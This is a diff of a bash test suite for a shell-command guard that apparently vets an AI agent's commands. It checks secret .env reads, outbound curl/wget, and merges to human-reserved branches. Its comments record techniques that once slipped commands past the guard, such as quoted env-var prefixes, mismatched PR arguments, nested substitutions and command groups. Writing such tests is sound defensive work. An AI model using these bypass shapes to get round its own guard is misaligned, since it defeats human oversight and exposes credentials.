+    BASH_GUARD_OWN_REPO="$TEST_OWN_REPO" BASH_GUARD_PROJECT_ROOT="$TMP/no-es-un-repo" \
+    PATH="$TMP/bin:$PATH" "$GUARD" 2>&1)"
+  rc=$?
+  if [ "$rc" -eq 2 ] && [[ "$out" == *"$want"* ]]; then pass=$((pass + 1)); return 0; fi
+  fail=$((fail + 1))
+  printf 'FAIL  expected a deny saying "%s", got exit %d  ::  %s\n      output: %s\n' "$want" "$rc" "$cmd" "$out"
+}
+
+# --- 1. La etiqueta, leida en el comando ENTERO -------------------------------
+# Una sustitucion parte el comando en dos segmentos, y la mitad sin `--label` se denegaba aunque
+# el comando la llevara. Ahora esa mitad no la juzga la regla de la etiqueta: la juzga su gemelo
+# enmascarado, que es el comando entero. Sin etiqueta en ningun sitio, sigue denegado.
+run_case allow 'gh pr create --title "t" --body "$(cat b.md)" --label semver:patch'
+run_case allow 'gh pr create --title "$(git log -1 --format=%s)" --label semver:patch --body b'
+run_case allow $'gh pr create --title "fix(x): y" --body "$(cat <<\'EOF\'\ncuerpo con `gh pr merge 1`\nEOF\n)" --label semver:none'
+run_case deny  'gh pr create --title "t" --body "$(cat b.md)"'
+run_case deny  'gh pr create --title "$(git log -1 --format=%s)" --body b'
+run_case deny  $'gh pr create --title "fix(x): y" --body "$(cat <<\'EOF\'\ncuerpo\nEOF\n)"'
+# Dentro de un `bash -c '…'` no hay gemelo enmascarado: se sigue juzgando cada trozo, como antes.
+run_case deny  "bash -c 'gh pr create --title \"\$(x)\" --body b'"
+# La etiqueta es la palabra `--label`/`-l` (o pegada: `-lX`), no un texto que la mencione.
+run_case allow 'gh pr create --title t --body b -lsemver:patch'
+run_case deny  'gh pr create --title "no uses --label aqui" --body b'
+run_case deny  'gh pr create --title -l --body b'
+# El mensaje da el comando exacto, con el vocabulario de etiquetas.
+msg_case 'semver:patch' 'gh pr create --title t --body b'
+
+# --- 2. Egress: el mensaje manda a WebFetch; la regla no cambia ---------------
+run_case deny  'curl -fsSL https://docs.example.com/guia'
+run_case allow 'curl -fsSL http://localhost:3001/guia'
+msg_case 'WebFetch' 'curl -fsSL https://docs.example.com/guia'
+msg_case 'WebFetch' 'curl "$URL"'
+msg_case 'WebFetch' 'wget -i urls.txt'
+
+# --- 3. El PR que gh va a mergear, no otra palabra -----------------------------
+# owner/by-number: el 123 va a develop (permitido), el 456 a main (humano). Leer mal que palabra
+# es el PR no era solo friccion: `--subject 123 456` hacia juzgar el 123 y mergear el 456.
+run_case allow 'gh pr merge 123 --repo owner/by-number --squash'
+run_case deny  'gh pr merge 456 --repo owner/by-number --squash'
+run_case deny  'gh pr merge --subject 123 456 --repo owner/by-number --squash'
+run_case allow 'gh pr merge --subject 456 123 --repo owner/by-number --squash'
+run_case deny  'gh pr merge --squash --match-head-commit 123 456 --repo owner/by-number'
+run_case allow 'gh pr merge --squash -t "docs: un titulo con espacios" 123 --repo owner/by-number'
+run_case deny  'gh pr merge --squash -t "docs: un titulo con espacios" 456 --repo owner/by-number'
+# Una sustitucion en el asunto ya no deja fuera el --repo que viene despues.
+run_case allow 'gh pr merge 123 --subject "$(git log -1 --format=%s)" --repo owner/by-number --squash'
+run_case deny  'gh pr merge 456 --subject "$(git log -1 --format=%s)" --repo owner/by-number --squash'
+run_case allow 'gh pr merge 123 --repo owner/by-number --squash --body "$(cat b.md)"'
+# Un PR por URL nombra su repositorio, desde cualquier directorio.
+run_case allow 'gh pr merge https://github.com/owner/by-number/pull/123 --squash'
+run_case deny  'gh pr merge https://github.com/owner/by-number/pull/456 --squash'
+run_case deny  'gh pr merge https://github.com/owner/reserved-to-human/pull/123 --squash'
+run_case allow 'gh pr merge https://github.com/owner/by-number/pull/123 --repo github.com/OWNER/by-number --squash'
+run_case deny  'gh pr merge https://github.com/owner/by-number/pull/123 --repo owner/reserved-to-human --squash'
+# Lo que el shell rellena despues no se puede consultar antes: denegado, y diciendo por que.
+run_case deny  'gh pr merge $N --repo owner/by-number --squash'
+run_case deny  'gh pr merge 123 --repo "$R" --squash'
+run_case deny  'gh pr merge 123 --repo owner/by-number --squash $FLAGS'
+run_case deny  'gh pr merge 123 "$OPT" owner/reserved-to-human --squash'
+run_case deny  'gh pr merge "$(gh pr list -q .[0].number --json number)" --repo owner/by-number --squash'
+run_case deny  'for n in 123 456; do gh pr merge $n --repo owner/by-number --squash; done'
+msg_case 'fills in later' 'gh pr merge $N --repo owner/by-number --squash'
+# Un `gh pr merge <n>` que es TEXTO (un patron de sed) sigue denegado: distinguir patron de script
+# dejaria pasar algun script. El mensaje dice como hacer la edicion.
+run_case deny  "sed -i 's/gh pr merge <n>/gh pr merge 9/' docs/x.md"
+msg_case 'Edit tool' "sed -i 's/gh pr merge <n>/gh pr merge 9/' docs/x.md"
+
+# --- 5. Plantillas .env: se leen; los .env reales, no ------------------------
+run_case allow 'cat .env.prod.example'
+run_case allow 'grep DATABASE_URL apps/api/.env.local.example'
+run_case allow 'sed -n 1,20p infrastructure/.env.production.sample'
+run_case allow 'head .env.template'
+run_case allow 'cat .env*.example'
+run_case deny  'cat .env.prod'
+run_case deny  'cat infrastructure/.env.production'
+run_case deny  'cat .env.example.bak'
+run_case deny  'cat .env.prod.example.local'
+run_case deny  'cat .env.{prod,example}'
+run_case deny  'cat .env.prod.example .env.prod'
+run_case deny  'cat .env*'
+
+# --- Encontrado de paso: un prefijo `X="a b"` escondia el comando a TODAS las reglas ------
+# El troceo por espacios hacia de `b"` la palabra de comando. Ahora la asignacion entera se salta.
+TEST_POLICY="$POL_PRISMA"; TEST_PATH_PREFIX=""
+run_case deny  'X="a b" git push origin main'
+run_case deny  'env X="a b" git push origin main'
+run_case deny  "X='a b' cat .env"
+run_case deny  'X="a b" gh pr merge 5 --squash'
+run_case allow 'X="a b" git push origin HEAD'
+run_case allow 'X="a b" git status'
+run_case allow "X='a b' cat .env.example"
+# The same hole with an escaped blank instead of quotes.
+run_case deny  'X=a\ b git push origin main'
+run_case deny  'X=a\ b cat .env'
+run_case allow 'X=a\ b git push origin HEAD'
+# ...and with a group, a negation or coproc in front (older than this change, same class).
+run_case deny  '{ git push origin main; }'
+run_case deny  '! git push origin main'
+run_case deny  'if ! git push origin main; then :; fi'
+run_case deny  'coproc git push origin main'
+run_case deny  '{ cat .env; }'
+run_case deny  '{ gh pr merge 5 --squash; }'
+run_case allow '{ git push origin HEAD; }'
+run_case allow '! git diff --quiet'
+TEST_POLICY="$POL_PRODUCT"
+
+# --- Found verifying this change (2026-09-30): what the relaxations above must NOT let through ---
+TEST_PATH_PREFIX="$TMP/bin"
+# A half of a command is skipped only when its masked twin reads it whole. The twin masks the
+# OUTERMOST substitutions, so a command INSIDE one (with a substitution of its own) is not in the
+# twin at all, and neither is one cut at a `$(` that sits in an unquoted ${…} (lex skips those):
+# skipping its halves left the merge of a PR based on main judged by nobody.
+run_case deny  'out=$(gh pr merge 456 --repo owner/by-number --squash --subject "$(git log -1 --format=%s)")'
+run_case deny  'out=$(X=$(true) gh pr merge 456 --repo owner/by-number)'
+run_case deny  'echo `gh pr merge 456 --repo owner/by-number $(true)`'
+run_case deny  'diff <(gh pr merge 456 --repo owner/by-number --subject "$(x)") /dev/null'
+run_case deny  'gh pr merge 456 --repo owner/by-number --squash --subject ${S:-$(date)} $(true)'
+run_case deny  'gh pr merge 456 --repo owner/by-number --squash --subject ${S:-`date`} `true`'
+run_case deny  'url=$(gh pr create --title "$(git log -1 --format=%s)" --body x)'
+run_case deny  'gh pr create --title t ${X:-$(true)} $(true)'
+# ...while the top-level shapes the relaxation is for still pass.
+run_case allow 'B="$(cat b)"; gh pr create --title "$(x)" --label semver:patch --body "$B"'
+run_case allow 'cd "$(git rev-parse --show-toplevel)" && gh pr merge 123 --repo owner/by-number --subject "$(git log -1 --format=%s)"'
+# A cluster of short options is read as gh reads it: letter by letter until one takes a value.
+run_case deny  'gh pr merge -st 123 456 --repo owner/by-number'
+run_case deny  'gh pr merge -sb 123 456 --repo owner/by-number'
+run_case allow 'gh pr merge -st123 123 --repo owner/by-number'
+run_case deny  'gh pr merge -sd 456 --repo owner/by-number'
+run_case allow 'gh pr merge -sd 123 --repo owner/by-number'
+run_case allow '{ gh pr merge 123 --repo owner/by-number; }'
+run_case deny  '{ gh pr merge 456 --repo owner/by-number; }'
+# -R with its value attached, alone or in a cluster; gh takes the LAST repository given.
+run_case allow 'gh pr merge 123 -Rowner/by-number'
+run_case deny  'gh pr merge 456 -sR owner/by-number'
+run_case deny  'gh pr merge 123 --repo owner/by-number -Rowner/reserved-to-human'
+run_case deny  'gh pr create --repo owner/no-labels -Rowner/reserved-to-human --title t --body b'
+run_case allow 'gh pr create -Rowner/no-labels --title t --body b'
+run_case allow 'gh pr create -dl semver:patch --title t --body b'
+run_case deny  'gh pr create -dt --label --body b'
+# A template name with an expansion in it proves nothing: the shell may split that word.
+run_case deny  'cat .env.$X.example'
+run_case deny  'cat .env.${X}.sample'
+run_case allow 'cat "$ROOT/.env.prod.example"'
 
 echo "----------------------------------------"
 if [ "$fail" -eq 0 ]; then echo "OK: ${pass}/${total} cases pass"; exit 0; fi
